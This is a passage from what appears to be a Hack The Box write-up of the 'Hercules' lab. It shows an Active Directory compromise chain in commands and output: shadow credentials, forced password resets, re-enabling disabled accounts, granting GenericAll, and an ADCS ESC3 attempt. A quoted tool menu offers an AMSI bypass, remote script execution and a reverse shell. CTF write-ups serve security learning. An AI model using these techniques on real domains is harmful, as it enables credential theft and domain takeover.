[2025-11-06 11:53:17] [Set-DomainObject] Success! modified new dn for CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
```

Then we proceed to add shadow credentials

Fist make sure the terminal you are using has `natalie.a` ticket in it's environment.. if not export it or use whatever method you use to auth with the ticket

```bash
certipy-ad shadow add -account auditor -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'auditor'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '6fc1ffd16e464c64a2d9b60bf6b3ebda'
[*] Adding Key Credential with device ID '6fc1ffd16e464c64a2d9b60bf6b3ebda' to the Key Credentials for 'auditor'
[*] Successfully added Key Credential with device ID '6fc1ffd16e464c64a2d9b60bf6b3ebda' to the Key Credentials for 'auditor'
[*] Saving certificate and private key to 'auditor.pfx'
[*] Saved certificate and private key to 'auditor.pfx'
```


Authenticate with the certificate to get NT hash

```bash
certipy-ad auth -pfx auditor.pfx -domain hercules.htb -dc-ip 10.10.11.91 -username auditor
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'auditor@hercules.htb'
[*] Trying to get TGT...
[-] Name mismatch between certificate and user 'auditor'
[-] See the wiki for more information
```

tried making this work but it didn't .. i really dont know why but working with `stephen.m` am able to get his NT hash.. we can use him to get to auditor since he has `forchangepassword` rights over the user.


```bash
impacket-getTGT hercules.htb/stephen.m -hashes aad3b435b51404eeaad3b435b51404ee:9aaaedcb19e612216a2dac9badb3c210 -dc-ip 10.10.11.91
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in stephen.m.ccache
```

export the ticket 

```bash
export KRB5CCNAME=stephen.m.ccache
```

Change auditor's password

```bash
bloodyAD -d hercules.htb --host dc.hercules.htb -k set password Auditor newPassword@12
[+] Password changed successfully!
```


Get ticket for auditor

```bash
impacket-getTGT hercules.htb/auditor:newPassword@12 -dc-ip 10.10.11.91
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in auditor.ccache
```

After setting the password i retried to get the nthash of auditor using the shadow credentials technique an this time it worked 

```bash
certipy-ad shadow add -account auditor -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'auditor'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '9e42502f15574b149d7d064c527bca23'
[*] Adding Key Credential with device ID '9e42502f15574b149d7d064c527bca23' to the Key Credentials for 'auditor'
[*] Successfully added Key Credential with device ID '9e42502f15574b149d7d064c527bca23' to the Key Credentials for 'auditor'
[*] Saving certificate and private key to 'auditor.pfx'
File 'auditor.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Saved certificate and private key to 'auditor.pfx'

┌──(darklight㉿ataraxia)-[~/…/htb/machines/hercules/AD]
└─$ certipy-ad auth -pfx auditor.pfx -domain hercules.htb -dc-ip 10.10.11.91 -username auditor
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'auditor@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'auditor.ccache'
File 'auditor.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): n
[*] Wrote credential cache to 'auditor_bcff51ab-1b2a-44dd-90b6-ea5710db674e.ccache'
[*] Trying to retrieve NT hash for 'auditor'
[*] Got hash for 'auditor@hercules.htb': aad3b435b51404eeaad3b435b51404ee:6420b4fd0c11c13742f75e7614d55d8c
```

cracking the hash against the password we created, it gets cracked..

```bash

6420b4fd0c11c13742f75e7614d55d8c:newPassword@12

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 6420b4fd0c11c13742f75e7614d55d8c
Time.Started.....: Thu Nov  6 12:44:14 2025 (0 secs)
Time.Estimated...: Thu Nov  6 12:44:14 2025 (0 secs)
```

Did it fails initially because it didn't have a password ?? i really don't know... 


Anyway let's go on to get a shell.. The normal `evil-winrm` had some troubles 

![[Pasted_image_20251107080107.png]]

I had to use this other one from this repo.. https://github.com/ozelis/winrmexec.git

```bash
 python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\auditor
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] '-dc-ip' not specified, using HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\auditor\Documents>
PS C:\Users\auditor\Documents>
```

We get the user flag.

### Privilege Escalation 

![[Pasted_image_20251107083209.png]]

On bloodhound we see that `HELPDESK ADMINISTRATORS` group has `forceChangePassword` rights over `fernando.r` user who is a member of `SMARTCARD OPERATORS` group. The group can perform `ADCSESC3` on the domain. This potentially allows us to obtain certificates fro other users. But currently we don't have access to `HELPDESK ADMINISTRATORS` group, or how to get there is not shown by bloodhound.

`FERNANDO.R` account is disabled 

![[Pasted_image_20251107085533.png]]

So even if were able to change the password of the account, it would be useless if we don't have a way of enabling it.

`FERNANDO.R` if a member of `SMARTCARD OPERATORS` group as noted earlier and `ACCOUNT OPERATORS` group has `GenericAll` rights over the group. Access to `ACCOUNT OPERATORS` group can give us the privileges to enable `FERNANADO.R` account.

![[Pasted_image_20251107085855.png]]

From bloodhound `ACCOUNT OPERATORS` group has no members.
Only high privileged users and groups has rights over the group. Another dead end.

![[Pasted_image_20251107090339.png]]

In order to perform `ADCSESC3` on the domain controller we have to answer two questions:

> [!question]
> - How will we get to `HELPDESK ADMINISTRATORS` group ?
> - How will we enable `FERNANDO.R` account ?

One other thing to note is that `SERVICE OPERATORS` groups has `forceChangePassword` rights over `IIS_WEBSERVER$` which has `allowedToAcl`, (RBCD), rights over the domain controller. `SERVICE OPERATORS` Has one user :

![[Pasted_image_20251107084842.png]]

The above image also shows the presence of another organization Unit that we have not come across so far, `FOREST MIGRATION`... WAIT!!! we also have the group `FOREST MANAGEMENT` which our current user `AUDITOR` is a member of... but in bloodhound we don't see anything related to `FOREST MANAGEMENT` having any rights over the `FOREST MIGRATION` OU, in fact the OU is not shown in bloodhound. 

If we follow this path then we have one question to answer:

> [!question]
> - How are we compromising the account `IIS_ADMINISTRATOR` ?

Also `HELPDESK ADMINISTRATORS` group has `forceChangePassword` rights over `IIS_WEBSERVER$`

![[Pasted_image_20251107105232.png]]



Now let's perform enumeration from a shell.


Getting all ACL for `HELPDESK ADMINISTRATORS` group 

```powershell
PS C:\Users\auditor> Get-Acl "AD:$((Get-ADGroup 'HELPDESK ADMINISTRATORS').DistinguishedName)" | Select-Object -ExpandProperty Access | Format-Table IdentityReference,Act
iveDirectoryRights,ObjectType,InheritanceType,InheritedObjectType,IsInherited -AutoSize

IdentityReference                                                                                  ActiveDirectoryRights
-----------------                                                                                  ---------------------
NT AUTHORITY\SELF                                                                                            GenericRead
NT AUTHORITY\Authenticated Users                                                                             GenericRead
NT AUTHORITY\SYSTEM                                                                                           GenericAll
BUILTIN\Account Operators                                                                                     GenericAll
HERCULES\Domain Admins                                                                                        GenericAll
NT AUTHORITY\Authenticated Users                                                                           ExtendedRight
BUILTIN\Windows Authorization Access Group                                                                  ReadProperty
HERCULES\Helpdesk Administrators                                                                           ExtendedRight
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ReadProperty
HERCULES\Key Admins                                                                          ReadProperty, WriteProperty
HERCULES\Enterprise Key Admins                                                               ReadProperty, WriteProperty
CREATOR OWNER                                                                                                       Self
NT AUTHORITY\SELF                                                                                                   Self
NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS                                                                  ReadProperty
NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS                                                                  ReadProperty
NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS                                                                  ReadProperty
NT AUTHORITY\SELF                                                                                          WriteProperty
BUILTIN\Pre-Windows 2000 Compatible Access                                                                   GenericRead
BUILTIN\Pre-Windows 2000 Compatible Access                                                                   GenericRead
BUILTIN\Pre-Windows 2000 Compatible Access                                                                   GenericRead
NT AUTHORITY\SELF                                                                            ReadProperty, WriteProperty
NT AUTHORITY\SELF                                                             ReadProperty, WriteProperty, ExtendedRight
HERCULES\Enterprise Admins                                                                                    GenericAll
BUILTIN\Pre-Windows 2000 Compatible Access                                                                  ListChildren
BUILTIN\Administrators                     ..., WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner
```

Nothing interesting, it seems high privileged users are the one who have rights over the group.

I will be using  the shell we have with evil-winrm and the shell I have started with powerview.py as auditor too


```powershell
KRB5CCNAME=auditor.ccache powerview hercules.htb/auditor@dc.hercules.htb -k --no-pass --dc-ip 10.10.11.91
Logging directory is set to /home/darklight/.powerview/logs/hercules-auditor-dc.hercules.htb
╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─ ❯
```

Checking the existence of the `FOREST MIGRATION` OU, we get this, a confirmation that the OU exists.

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─ ❯ Get-DomainOU -Identity "Forest Migration"
objectClass               : top
                            organizationalUnit
ou                        : Forest Migration
distinguishedName         : OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
instanceType              : 4
whenCreated               : 04/12/2024 01:44:31 (11 months, 3 days ago)
whenChanged               : 04/12/2024 01:45:07 (11 months, 3 days ago)
uSNCreated                : 12847
uSNChanged                : 13473
name                      : Forest Migration
objectGUID                : {04dadaa7-37a4-440a-b381-89a3f274446f}
objectCategory            : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=hercules,DC=htb
dSCorePropagationData     : 11/07/2025 07:10:13 AM
                            11/07/2025 06:58:13 AM
                            11/07/2025 06:46:12 AM
                            11/07/2025 06:34:13 AM
                            01/01/1601 00:00:00 AM
```

Checking if `FOREST MANAGEMENT` group has rights over the OU

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─ ❯ Get-DomainObjectAcl -Identity "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -Where "SecurityIdentifier contains Forest Management" -ResolveGUIDs
ObjectDN                    : OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
ObjectSID                   : None
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : FullControl
AccessMask                  : FullControl
InheritanceType             : None
SecurityIdentifier          : HERCULES\Forest Management

ObjectDN                    : OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
ObjectSID                   : None
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE
ActiveDirectoryRights       : Read
AccessMask                  : Read
InheritanceType             : None
SecurityIdentifier          : HERCULES\Forest Management
```

`FOREST MANAGEMENT` group has `FullControl` rights over `ForestMigration`  OU 

Listing objects in the OU

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─ ❯ Get-DomainObject -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -LDAPFilter "(objectClass=*)" -Select "name,samAccountName,objectClass"
objectClass        : top
                     person
                     organizationalPerson
                     user
name               : Fernando Rodriguez
sAMAccountName     : fernando.r

objectClass        : top
                     person
                     organizationalPerson
                     user
name               : Taylor Maxwell
sAMAccountName     : taylor.m

objectClass        : top
                     person
                     organizationalPerson
                     user
name               : IIS_Administrator
sAMAccountName     : iis_administrator

objectClass        : top
                     group
name               : Windows Computer Administrators
sAMAccountName     : Windows Computer Administrators

objectClass        : top
                     person
                     organizationalPerson
                     user
                     computer
name               : ENTERPRISE02-8.1
sAMAccountName     : ENTERPRISE02-8.1$

objectClass        : top
                     person
                     organizationalPerson
                     user
                     computer
name               : ENTERPRISE01-8.1
sAMAccountName     : ENTERPRISE01-8.1$

objectClass        : top
                     person
                     organizationalPerson
                     user
                     computer
name               : WINSRV03-2016
sAMAccountName     : WINSRV03-2016$

objectClass        : top
                     person
                     organizationalPerson
                     user
                     computer
name               : WINSRV02-2016
sAMAccountName     : WINSRV02-2016$

objectClass        : top
                     person
                     organizationalPerson
                     user
                     computer
name               : WINSRV01-2016
sAMAccountName     : WINSRV01-2016$

objectClass        : top
                     person
                     organizationalPerson
                     user
name               : Anthony Rudd
sAMAccountName     : anthony.r

objectClass        : top
                     person
                     organizationalPerson
                     user
name               : James Silver
sAMAccountName     : james.s

objectClass        : top
                     organizationalUnit
name               : Forest Migration
```

As user `AUDITOR` we have `FullControl` on the above objects including `FERNANDO.R`

So far we have answered two questions:

> [!question]
> - How are we compromising the account `IIS_ADMINISTRATOR` ?
> - How will we enable `FERNANDO.R` account ?

Actually we can also reset the password for `FERNANDO.R` since we already have `fullControl` over the user, we don't really need to be in `HELPDESK ADMINISTRATOR` group. So basically we have answered all our questions 🥲

First we enable `FERNANSO.R` account then change the password.

```bash
KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k remove uac -f ACCOUNTDISABLE fernando.r
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/remove.py", line 288, in uac
    conn.ldap.bloodymodify(
    ~~~~~~~~~~~~~~~~~~~~~~^
        target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"
```

I usually dont understand this part.. am a little tired to research about it .. like a group has rights over an object but the users in the group dont have the rights yet >>

We just need to give `AUDITOR` `genericAll` rights 

```bash
KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" auditor
[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

Enabling the account

```bash
KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k remove uac -f ACCOUNTDISABLE fernando.r
[-] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
```


Changing the password

```bash
KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k set password fernando.r newPassword@12
[+] Password changed successfully!
```


Getting a Ticket 

```bash
impacket-getTGT hercules.htb/fernando.r:"newPassword@12" -k -no-pass -dc-ip 10.10.11.91
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in fernando.r.ccache
```


#### ADCS ESC3

More on ESC3 and how to exploit it checkout this https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template

First we identify the vulnerable certificate templates 

```bash
certipy-ad find -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : CA-HERCULES
    DNS Name                            : dc.hercules.htb
    Certificate Subject                 : CN=CA-HERCULES, DC=hercules, DC=htb
    Certificate Serial Number           : 1DD5F287C078F9924ED52E93ADFA1CCB
    Certificate Validity Start          : 2024-12-04 01:34:17+00:00
    Certificate Validity End            : 2034-12-04 01:44:17+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HERCULES.HTB\Administrators
      Access Rights
        ManageCa                        : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        ManageCertificates              : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Enroll                          : HERCULES.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```



Secondly we request a certificate for `FERNANADO.R`

```bash
certipy-ad req -u 'fernando.r@hercules.htb' -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target 'dc.hercules.htb' -ca 'CA-HERCULES' -template 'EnrollmentAgentOffline'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```


Requesting certificate for `Administrator` fails 

```bash
KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip "10.10.11.91" -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "User" -pfx fernando.r.pfx -on-behalf-of "hercules\administrator" -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 27
[-] Got error while requesting certificate: code: 0x80094009 - CERTSRV_E_RESTRICTEDOFFICER - The operation is denied. It can only be performed by a certificate managerthat is allowed to manage certificates for the current requester.
Would you like to save the private key? (y/N): n
[-] Failed to request certificate
```



> [!warning]
> The error code **0x80094009**, also known as **CERTSRV_E_RESTRICTEDOFFICER**, indicates that an operation was denied because it can only be performed by a certificate manager authorized to manage certificates for the current requester.
> This typically occurs during certificate enrollment processes, particularly when using the Enroll on Behalf of (EOBO) mechanism, where a certificate enrollment agent attempts to request a certificate on behalf of a user without proper authorization.
> 
> So the command `certipy-ad req ... -on-behalf-of "hercules\administrator"` failed with **0x80094009 (CERTSRV_E_RESTRICTEDOFFICER)** because the CA is configured to block `on-behalf-of` enrollment for that privileged account; only a certificate manager or a request carrying an authorized signature/manager approval is permitted to request certificates for `Administrator`, so the CA refused the operation.


same error for other privileged users.

But we have another path, **RBCD** . We need to compromise `IIS_ADMINISTRATOR` which has `forceChangePassword` rights over `IIS_WEBSERVER$` which has `allowedToAcl`, (RBCD), rights over the domain controller. 

We already know how to get to `IIS_ADMINISTRATOR`

```bash
KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" auditor
[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

Trying to change the password for `IIS_ADMINISTRATOR` fails. Checking if the account is enabled, we get that the account is not enabled 

```bash
KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k get object iis_administrator --attr userAccountControl

distinguishedName: CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

Enabling the account

```bash
KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k remove uac iis_administrator -f ACCOUNTDISABLE
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/remove.py", line 288, in uac
    conn.ldap.bloodymodify(
    ~~~~~~~~~~~~~~~~~~~~~~^
        target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"
```

It fails even though we have `FullControl` on `ForestMigration` OU which `IIS_ADMINISTRATOR` is a member of...  🤔. I think this shouldn't fail unless we missed something... but everything just says this shouldn't fail... 

![[Pasted_image_20251107224625.png]]


Back to the drawing board...

Other users that are in the `FOREST MIGRATION` OU are  `JAMES.S` and `ANTHONY.R` who are members of `WiNDOWS COMPUTER ADMINISTRATORS`.  Bloodhound does not show any interesting rights that the group has. 

![[Pasted_image_20251108054420.png]]


We also have `TAYLOR.M`, but nothing special about the user 

![[Pasted_image_20251108054735.png]]

Nothing interesting from bloodhound.

Checking any writable for `ANTHONY.R` 

```bash
KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" auditor
[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k remove uac anthony.r -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from anthony.r's' userAccountControl

KRB5CCNAME=auditor.ccache bloodyAD -d hercules.htb --host dc.hercules.htb -k set password anthony.r newPassword@12
